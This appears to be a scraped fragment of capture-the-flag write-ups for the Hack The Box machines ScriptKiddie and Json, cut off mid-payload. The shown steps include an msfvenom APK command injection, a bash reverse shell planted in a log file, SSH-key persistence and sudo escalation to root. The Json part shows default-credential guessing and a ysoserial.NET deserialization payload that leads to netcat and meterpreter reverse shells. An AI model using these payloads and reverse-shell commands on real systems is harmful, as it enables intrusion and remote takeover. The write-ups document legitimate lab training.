msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; run [+] msf.apk stored at /root/.msf4/local/msf.apk\nUpload msf.apk and press “generate”\n[root:/git/htb/scriptkiddie]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.226] 47236 whoami kid python3 -c ‘import pty;pty.spawn(“/bin/bash”)’; kid@scriptkiddie:~/html$\nkid@scriptkiddie:~$ cat user.txt cat user.txt 5b891f5e20131d5de2f53b54ef3d7782\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nCreate a stable shell by adding pub key to .ssh/authorized_keys\n\n[root:/git/htb/scriptkiddie]# ssh-keygen -t rsa (master✱) Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /git/htb/scriptkiddie/kid-id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /git/htb/scriptkiddie/kid-id_rsa Your public key has been saved in /git/htb/scriptkiddie/kid-id_rsa.pub The key fingerprint is: SHA256:s9bcIqIjG7KEjauufCkNPenOdi/7ky/1ytozY8bjHYQ root@nidus The key’s randomart image is: +—[RSA 3072]—-+ | | | | | | | . | | . . SE . | |.+ + .. | |+. o . B =.. | |o=oB.+ oX.o. | |Oo=oo=+O**. | +—-[SHA256]—–+\nkid@scriptkiddie:~/.ssh$ echo “ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHi3TbD+fe7fOG2dQmwrmhFQHpJZ4bfJdh4cEEVrEeQyzOpfitMLixOQ9LjUEh+SPUpBEghi0bODevh+dBaw5XBcl9tJXrq21369X+DB2iKnXxk4KMwnJXWJ1CCO5RXRbFx2Ha7pM3jBzKwwQhsgV0aq/LXOPmWK5rfC17GBjB24EOl2QQ5juvjFM61fwesJ3jIGeFMZh846cDQMiYbVlvizg9YxWqZxScVfYBSG1MjgPbg0YwTwdCH47T807Qvbuz6KrEOPhMSADOFh0/lpAe7n8nmHZkGuwOSry3KKR/j523yOATiu8yX0PYy2h0Twp/DDHNxuLoII8abV18GM8rWk53DUw/eCuvKTEaqImJAMh8yUIdWSaYWbiVTh9UvC0Irb7X8a9bej2/+nC5bDJ+ujUKA1TIW2WaeKKLTHZVNKSFNv3i2nuvxlgv+73u3jifbFV9h5qTKg3bCHg+DzgYyVJczT2Id7018I/vlwG9vrAIfDfJ8CjwzWV1ubMlYs0=” &gt; ~/.ssh/authorized_keys\n[root:/git/htb/scriptkiddie]# ssh kid@scriptkiddie.htb -i kid-id_rsa kid@scriptkiddie:~$\n\nEnumerating the box we quickly find /home/pwn, and within the script scanlosers.sh. The script looks on the file ‘/home/kid/logs/hackers’ and scan their IP with nmap. Maybe we can inject some code in this file and get it to run as user pwn.\nkid@scriptkiddie:~/logs$ echo “test &/bin/bash -c ‘bash -i &gt;& /dev/tcp/10.10.14.4/4488 0&gt;&1’” &gt;&gt; hackers\n[root:/git/htb/scriptkiddie]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.226] 47908 bash: cannot set terminal process group (866): Inappropriate ioctl for device bash: no job control in this shell pwn@scriptkiddie:~$\nAs user pwn, look to see if we have any sudo privs.\n\npwn@scriptkiddie:~/.ssh$ sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser pwn may run the following commands on scriptkiddie:\n    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole\npwn@scriptkiddie:~/.ssh$ sudo /opt/metasploit-framework-6.0.9/msfconsole msf6 &gt; cat /root/root.txt [*] exec: cat /root/root.txt\nb679a52ec65c3c4a12445dc29832ef74\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\napk code injection https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/"
  },
  {
    "objectID": "posts/2020-01-22-htb-writeup-json/2020-01-22-htb-writeup-json.html",
    "href": "posts/2020-01-22-htb-writeup-json/2020-01-22-htb-writeup-json.html",
    "title": "Json - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/json#nmapAutomatorDirb.sh 10.10.10.158 All PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Json HTB 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC\nHost script results: |clock-skew: mean: 4h00m26s, deviation: 0s, median: 4h00m26s |nbstat: NetBIOS name: JSON, NetBIOS user: , NetBIOS MAC: 00:50:56:b9:e7:01 (VMware) |smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used:  | authentication_level: user | challenge_response: supported | message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: | Message signing enabled but not required | smb2-time: | date: 2020-01-23T11:41:50 | start_date: 2020-01-22T22:01:06\nPORT STATE SERVICE VERSION 137/udp open netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n==&gt; DIRECTORY: http://10.10.10.158/css/ ==&gt; DIRECTORY: http://10.10.10.158/files/ ==&gt; DIRECTORY: http://10.10.10.158/img/\n\nhttp://10.10.10.158/index.html (CODE:200|SIZE:40163) ==&gt; DIRECTORY: http://10.10.10.158/js/ ==&gt; DIRECTORY: http://10.10.10.158/views/\n\nWe are unable to get any unauthenticated information via rpcclient, smbclient or ftp. Visiting the webpage shows us a brief authenticated session, and then we are forwarded to the login page /login.html. The site is unsecure (http) and by looking at the js data we can identify that it uses OAuth2 and Bearer tokens. Looking further at app.min.js we find a few functions, ‘/api/token’ and ‘/api/Account/’.\n\nUsing curl we can try to get a bearer token, although it’s a guessing game.\nroot@p3:/opt/htb/machines/json# curl -v json.htb/api/token -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ –data ‘{“UserName”:“admin”,“Password”:“password”}’ * Trying 10.10.10.158:80… * TCP_NODELAY set * Connected to json.htb (10.10.10.158) port 80 (#0) &gt; POST /api/token HTTP/1.1 &gt; Host: json.htb &gt; User-Agent: curl/7.67.0 &gt; Accept: application/json &gt; Content-Type: application/json &gt; Content-Length: 42 &gt; * upload completely sent off: 42 out of 42 bytes * Mark bundle as not supporting multiuse &lt; HTTP/1.1 404 Not Found &lt; Cache-Control: no-cache &lt; Pragma: no-cache &lt; Content-Type: application/json; charset=utf-8 &lt; Expires: -1 &lt; Server: Microsoft-IIS/8.5 &lt; X-AspNet-Version: 4.0.30319 &lt; X-Powered-By: ASP.NET &lt; Date: Thu, 23 Jan 2020 13:31:23 GMT &lt; Content-Length: 17 &lt; * Connection #0 to host json.htb left intact “User Not Exists”\nThe Credentials admin:password doesn’t work, however admin:admin do work and we get a base64 encrypted OAuth2 cookie. root@p3:/opt/htb/machines/json# curl -v json.htb/api/token -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ –data ‘{“UserName”:“admin”,“Password”:“admin”}’ * Trying 10.10.10.158:80… * TCP_NODELAY set * Connected to json.htb (10.10.10.158) port 80 (#0) &gt; POST /api/token HTTP/1.1 &gt; Host: json.htb &gt; User-Agent: curl/7.67.0 &gt; Accept: application/json &gt; Content-Type: application/json &gt; Content-Length: 39 &gt; * upload completely sent off: 39 out of 39 bytes * Mark bundle as not supporting multiuse &lt; HTTP/1.1 202 Accepted &lt; Cache-Control: no-cache &lt; Pragma: no-cache &lt; Expires: -1 &lt; Server: Microsoft-IIS/8.5 &lt; X-AspNet-Version: 4.0.30319 &lt; Set-Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=; expires=Thu, 23-Jan-2020 13:34:52 GMT; path=/ &lt; X-Powered-By: ASP.NET &lt; Date: Thu, 23 Jan 2020 13:32:52 GMT &lt; Content-Length: 0 &lt; * Connection #0 to host json.htb left intact\nDecrypting the OAuth2 info gives us: {“Id”:1,“UserName”:“admin”,“Password”:“21232f297a57a5a743894a0e4a801fc3”,“Name”:“User Admin HTB”,“Rol”:“Administrator”}\nInstead of decrypting the OAuth2 data, we could also send it as a Bearer token using the header option ‘Bearer’. This would produce the same result.\nroot@p3:/opt/htb/machines/json# curl -v 10.10.10.158/api/Account/ -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ -H ‘Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=’ * Trying 10.10.10.158:80… * TCP_NODELAY set * Connected to 10.10.10.158 (10.10.10.158) port 80 (#0) &gt; GET /api/Account/ HTTP/1.1 &gt; Host: 10.10.10.158 &gt; User-Agent: curl/7.67.0 &gt; Accept: application/json &gt; Content-Type: application/json &gt; Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0= &gt; * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK &lt; Cache-Control: no-cache &lt; Pragma: no-cache &lt; Content-Type: application/json; charset=utf-8 &lt; Expires: -1 &lt; Server: Microsoft-IIS/8.5 &lt; X-AspNet-Version: 4.0.30319 &lt; X-Powered-By: ASP.NET &lt; Date: Thu, 23 Jan 2020 13:37:59 GMT &lt; Content-Length: 119 &lt; * Connection #0 to host 10.10.10.158 left intact {“Id”:1,“UserName”:“admin”,“Password”:“21232f297a57a5a743894a0e4a801fc3”,“Name”:“User Admin HTB”,“Rol”:“Administrator”}\n\nAs we can see in the response it is a .NET application and we can inject data in to the Bearer. Googling around there is an deserialization RCE attack possible using ysoserial.NET. To create our payload it’s easiest using a windows box.\n\nWe create a poc payload that will ping our localhost to verify functionality.\n\nysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c “ping 10.10.14.8” &gt; rce-ping.txt\n\nReplace the legit Bearer data with our new created payload. Before executing the curl / Burp request setup tcpdump to confirm the incomming icmp from the victim machine.\ncurl -v 10.10.10.158/api/Account/ -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ -H ‘Bearer: ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywKICAgICAgICAgICAgICAgICAgICAnU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmJvb3RzdHJhcENvbnRleHQnOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUJJdll5QndhVzVuSURFd0xqRXdMakUwTGpnR0J3QUFBQU5qYldRRUJRQUFBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlBd0FBQUFoRVpXeGxaMkYwWlFkdFpYUm9iMlF3QjIxbGRHaHZaREVEQXdNd1UzbHpkR1Z0TGtSbGJHVm5ZWFJsVTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2l0RVpXeGxaMkYwWlVWdWRISjVMMU41YzNSbGJTNVNaV1pzWldOMGFXOXVMazFsYldKbGNrbHVabTlUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5TDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUNRZ0FBQUFKQ1FBQUFBa0tBQUFBQkFnQUFBQXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnVkSEo1QndBQUFBUjBlWEJsQ0dGemMyVnRZbXg1Qm5SaGNtZGxkQkowWVhKblpYUlVlWEJsUVhOelpXMWliSGtPZEdGeVoyVjBWSGx3WlU1aGJXVUtiV1YwYUc5a1RtRnRaUTFrWld4bFoyRjBaVVZ1ZEhKNUFRRUNBUUVCQXpCVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5SzBSbGJHVm5ZWFJsUlc1MGNua0dDd0FBQUxBQ1UzbHpkR1Z0TGtaMWJtTmdNMXRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFN4YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhTeGJVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTXNJRk41YzNSbGJTd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFZTUFBQUFTMjF6WTI5eWJHbGlMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1FvR0RRQUFBRWxUZVhOMFpXMHNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1Qmc0QUFBQWFVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTUdEd0FBQUFWVGRHRnlkQWtRQUFBQUJBa0FBQUF2VTNsemRHVnRMbEpsWm14bFkzUnBiMjR1VFdWdFltVnlTVzVtYjFObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJSEFBQUFCRTVoYldVTVFYTnpaVzFpYkhsT1lXMWxDVU5zWVhOelRtRnRaUWxUYVdkdVlYUjFjbVVLVTJsbmJtRjBkWEpsTWdwTlpXMWlaWEpVZVhCbEVFZGxibVZ5YVdOQmNtZDFiV1Z1ZEhNQkFRRUJBUUFEQ0ExVGVYTjBaVzB1Vkhsd1pWdGRDUThBQUFBSkRRQUFBQWtPQUFBQUJoUUFBQUErVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01nVTNSaGNuUW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtHRlFBQUFENVRlWE4wWlcwdVJHbGhaMjV2YzNScFkzTXVVSEp2WTJWemN5QlRkR0Z5ZENoVGVYTjBaVzB1VTNSeWFXNW5MQ0JUZVhOMFpXMHVVM1J5YVc1bktRZ0FBQUFLQVFvQUFBQUpBQUFBQmhZQUFBQUhRMjl0Y0dGeVpRa01BQUFBQmhnQUFBQU5VM2x6ZEdWdExsTjBjbWx1WndZWkFBQUFLMGx1ZERNeUlFTnZiWEJoY21Vb1UzbHpkR1Z0TGxOMGNtbHVaeXdnVTNsemRHVnRMbE4wY21sdVp5a0dHZ0FBQURKVGVYTjBaVzB1U1c1ME16SWdRMjl0Y0dGeVpTaFRlWE4wWlcwdVUzUnlhVzVuTENCVGVYTjBaVzB1VTNSeWFXNW5LUWdBQUFBS0FSQUFBQUFJQUFBQUJoc0FBQUJ4VTNsemRHVnRMa052YlhCaGNtbHpiMjVnTVZ0YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhWMEpEQUFBQUFvSkRBQUFBQWtZQUFBQUNSWUFBQUFLQ3c9PScKICAgICAgICAgICAgICAgIH0=’\nroot@p3:/opt/htb/machines/json# tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 08:21:47.434315 IP json.htb &gt; p3: ICMP echo request, id 1, seq 17, length 40 08:21:47.434337 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 17, length 40 08:21:48.450946 IP json.htb &gt; p3: ICMP echo request, id 1, seq 18, length 40 08:21:48.450982 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 18, length 40 08:21:49.466503 IP json.htb &gt; p3: ICMP echo request, id 1, seq 19, length 40 08:21:49.466542 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 19, length 40 08:21:50.482371 IP json.htb &gt; p3: ICMP echo request, id 1, seq 20, length 40 08:21:50.482411 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 20, length 40\nICMP comming from json.htb &gt; p3 confirms that the rce is working. We now need to militarize this to get user.\n\nJust like normally I create the reverse shell executing nc64.exe from my smb share. &gt; ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c “\\10.10.14.8-share64.exe 10.10.14.8 4488 -e powershell” &gt; rce-reverse.txt\n\nRunning the newly created payload gives us a reverse connecting, however it halts. We are unable to do anything.\nroot@p3:/opt/htb/machines/json# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.158] 55376 Windows PowerShell Copyright (C) 2014 Microsoft Corporation. All rights reserved.\nWe need to create a new payload, this time lets use msfvenom to create a reverse meterpreter session.\nroot@p3:/opt/htb/machines/json# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4400 -f exe &gt; json-expl.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes\nCreate a new (Bearer) execution using ysoserial to tigger the reverse meterpreter. &gt; ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c “\\10.10.14.8-share-expl.exe” &gt; rce-meterpreter.txt\nWe now have the two components needed to get the shell. Start up msfdb exploit/multi/handler and use payload windows/x64/meterpreter/reverse_tcp to receive the reverse.\nroot@p3:/srv/pub-share# curl -v 10.10.10.158/api/Account/ -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ -H ‘Bearer: ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywKICAgICAgICAgICAgICAgICAgICAnU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmJvb3RzdHJhcENvbnRleHQnOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUNjdll5QmNYREV3TGpFd0xqRTBMamhjY0hWaUxYTm9ZWEpsWEdwemIyNHRaWGh3YkM1bGVHVUdCd0FBQUFOamJXUUVCUUFBQUNKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBaEVaV3hsWjJGMFpRZHRaWFJvYjJRd0IyMWxkR2h2WkRFREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnVkSEo1TDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUwxTjVjM1JsYlM1U1pXWnNaV04wYVc5dUxrMWxiV0psY2tsdVptOVRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUWdBQUFBSkNRQUFBQWtLQUFBQUJBZ0FBQUF3VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJ3QUFBQVIwZVhCbENHRnpjMlZ0WW14NUJuUmhjbWRsZEJKMFlYSm5aWFJVZVhCbFFYTnpaVzFpYkhrT2RHRnlaMlYwVkhsd1pVNWhiV1VLYldWMGFHOWtUbUZ0WlExa1pXeGxaMkYwWlVWdWRISjVBUUVDQVFFQkF6QlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1ZuWVhSbFJXNTBjbmtHQ3dBQUFMQUNVM2x6ZEdWdExrWjFibU5nTTF0YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhTeGJVM2x6ZEdWdExsTjBjbWx1Wnl3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYU3hiVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01zSUZONWMzUmxiU3dnVm1WeWMybHZiajAwTGpBdU1DNHdMQ0JEZFd4MGRYSmxQVzVsZFhSeVlXd3NJRkIxWW14cFkwdGxlVlJ2YTJWdVBXSTNOMkUxWXpVMk1Ua3pOR1V3